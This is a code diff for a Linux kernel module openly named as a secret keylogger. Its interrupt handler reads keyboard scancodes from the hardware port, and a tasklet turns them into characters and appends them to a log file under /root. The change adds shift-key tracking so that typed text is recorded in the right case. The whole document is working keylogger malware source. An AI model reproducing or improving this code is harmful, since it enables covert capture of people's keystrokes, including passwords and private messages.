@@ -24,13 +24,10 @@ const char *NAME = "---Secret_Keylogger---";
 const char *LOG_FILE = "/root/log";
 struct file* log_fp;
 loff_t log_offset;
-unsigned char g;
 struct task_struct *logger;
 
 struct logger_data{
-	char scancode;
-	char status;
-	struct cdev cdev;
+	unsigned char scancode;
 } ld;
 
 /* =================================================================== */
@@ -84,15 +81,13 @@ void tasklet_logger(unsigned long data)
 	static int shift = 0;
 
 	printk("ld->scancode = %d\n", ldata->scancode);	
-	/*char buf[16];
-	memset(buf, 0, sizeof(buf));
-	sprintf(buf, "[%d]", ldata->scancode);
-	log_write(log_fp, buf, sizeof(buf));*/
-	if(ldata->scancode > 0 && ldata->scancode <= 170){
-		char buf[16];
+	/*if(ldata->scancode > 0 && ldata->scancode <= 170){*/
+	if(1){
+		char buf[32];
 		memset(buf, 0, sizeof(buf));
 		switch(ldata->scancode){
 			default: 
+				/*sprintf(buf, "[%d]", ldata->scancode);*/
 				break;
 
 			case 1:
@@ -183,10 +178,10 @@ void tasklet_logger(unsigned long data)
 				strcpy(buf, "(CTRL)"); break;
 
 			case 30:
-				strcpy(buf, "a"); break;
+				strcpy(buf, (shift) ? "A" : "a"); break;
 
 			case 31:
-				strcpy(buf, "s"); break;
+				strcpy(buf, (shift) ? "S" : "s"); break;
 
 			case 32:
 				strcpy(buf, "d"); break;
@@ -219,10 +214,13 @@ void tasklet_logger(unsigned long data)
 				strcpy(buf, "`"); break;
 
 			case 42:
-			case 170:
-				/*strcpy(buf, "(SHIFT)"); break;*/
-				sprintf(buf, "(SHIFT-%d)", ldata->status); break;
+				/*strcpy(buf, "(SHIFT-PRESSED)"); break;	*/
+				shift = 1; break;
 
+			case 170:
+				/*strcpy(buf, "(SHIFT-RELEASED)"); break;*/
+				shift = 0; break;
+	
 			case 44:
 				strcpy(buf, "z"); break;
 			
@@ -291,10 +289,8 @@ DECLARE_TASKLET(my_tasklet, tasklet_logger, (unsigned long)&ld);
 irq_handler_t kb_irq_handler(int irq, void *dev_id, struct pt_regs *regs)
 {
 	struct logger_data *ldata = (struct logger_data*)dev_id;
-	static unsigned char scancode, status;
 
 	ldata->scancode = inb(0x60);
-	ldata->status = inb(0x64);
 
 	tasklet_schedule(&my_tasklet);
 	/* TODO:
@@ -347,7 +343,6 @@ static int __init kb_init(void)
 
 static void __exit kb_exit(void)
 {
-	/*kthread_stop(logger);*/
 	tasklet_kill(&my_tasklet);
 	free_irq(KB_IRQ, &ld);
 	if(log_fp != NULL){
